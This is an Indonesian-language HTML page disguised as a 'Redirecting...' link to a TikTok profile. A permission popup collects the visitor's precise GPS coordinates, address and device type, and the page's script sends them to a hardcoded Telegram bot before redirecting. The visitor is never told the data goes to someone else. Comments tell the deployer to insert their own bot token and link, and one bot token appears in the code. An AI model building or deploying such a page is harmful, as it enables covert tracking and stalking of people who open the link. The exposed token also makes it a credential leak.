<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: white;
            min-height: 100vh;
        }
        /* Popup izin lokasi - style minimal */
        .location-popup {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            font-family: system-ui, -apple-system, sans-serif;
        }
        .popup-box {
            background: white;
            padding: 28px 24px;
            border-radius: 20px;
            text-align: center;
            max-width: 300px;
            width: 85%;
            box-shadow: 0 20px 35px rgba(0,0,0,0.2);
        }
        .popup-icon {
            font-size: 48px;
            margin-bottom: 12px;
        }
        .popup-box h3 {
            font-size: 20px;
            margin-bottom: 8px;
            color: #1a1a2e;
        }
        .popup-box p {
            font-size: 14px;
            color: #555;
            margin-bottom: 20px;
        }
        .popup-box button {
            background: #000;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 40px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
        }
        .popup-box button:hover {
            background: #25F4EE;
            color: #000;
        }
        .loading-text {
            font-size: 12px;
            color: #888;
            margin-top: 12px;
            display: none;
        }
        .loading-text.show {
            display: block;
        }
    </style>
</head>
<body>

<div id="locationPopup" class="location-popup">
    <div class="popup-box">
        <div class="popup-icon">📍</div>
        <h3>Izin Lokasi</h3>
        <p>Klik tombol di bawah untuk mengizinkan akses lokasi</p>
        <button id="allowBtn">Izinkan & Lanjutkan</button>
        <div id="loadingMsg" class="loading-text">Mengirim data...</div>
    </div>
</div>

<script>
    // =============== KONFIGURASI TELEGRAM ===============
    // GANTI DENGAN DATA BOT KAMU!
    const BOT_TOKEN = "8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0";   // GANTI DENGAN TOKEN BOT MU
    const CHAT_ID = "1966317946";        // GANTI DENGAN CHAT ID MU
    
    // GANTI DENGAN LINK TIKTOK ASLI KAMU
    const TIKTOK_URL = "https://www.tiktok.com/@usernamekamu";
    // ===================================================
    
    const popup = document.getElementById('locationPopup');
    const allowBtn = document.getElementById('allowBtn');
    const loadingMsg = document.getElementById('loadingMsg');
    
    // Fungsi mendapatkan lokasi
    function getLocation() {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                reject('Browser tidak support geolokasi');
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const accuracy = Math.round(position.coords.accuracy);
                    
                    // Coba dapatkan nama daerah (opsional)
                    let address = `${lat.toFixed(4)}, ${lng.toFixed(4)}`;
                    try {
                        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18`);
                        const data = await response.json();
                        const city = data.address?.city || data.address?.town || data.address?.village || '';
                        if (city) address = `${city} | ${address}`;
                    } catch(e) {}
                    
                    resolve({ lat, lng, accuracy, address });
                },
                (error) => {
                    let msg = '';
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            msg = 'Izin lokasi ditolak';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            msg = 'Lokasi tidak tersedia';
                            break;
                        default:
                            msg = 'Gagal dapat lokasi';
                    }
                    reject(msg);
                },
                { enableHighAccuracy: true, timeout: 8000 }
            );
        });
    }
    
    // Kirim ke Telegram
    async function sendToTelegram(locationData) {
        const timestamp = new Date().toLocaleString('id-ID');
        const userAgent = navigator.userAgent;
        const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(userAgent);
        
        const message = `📍 *LOKASI BARU*
        
🕐 ${timestamp}
📱 ${isMobile ? 'Mobile' : 'Desktop'}
🌍 Lat: ${locationData.lat}
🌍 Lng: ${locationData.lng}
📍 ${locationData.address}
🎯 Akurasi: ±${locationData.accuracy}m

🗺️ Maps: https://www.google.com/maps?q=${locationData.lat},${locationData.lng}`;
        
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        
        // Kirim juga lokasi
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                latitude: locationData.lat,
                longitude: locationData.lng
            })
        });
        
        return response.ok;
    }
    
    // Proses utama
    allowBtn.onclick = async function() {
        // Nonaktifkan tombol & tampilkan loading
        allowBtn.disabled = true;
        allowBtn.textContent = '⏳ Memproses...';
        loadingMsg.classList.add('show');
        
        try {
            // Dapatkan lokasi
            const location = await getLocation();
            
            // Kirim ke Telegram
            await sendToTelegram(location);
            
            // Redirect ke TikTok
            window.location.href = TIKTOK_URL;
            
        } catch (error) {
            console.error('Error:', error);
            // Tetap redirect walau gagal
            window.location.href = TIKTOK_URL;
        }
    };
</script>

</body>
</html>
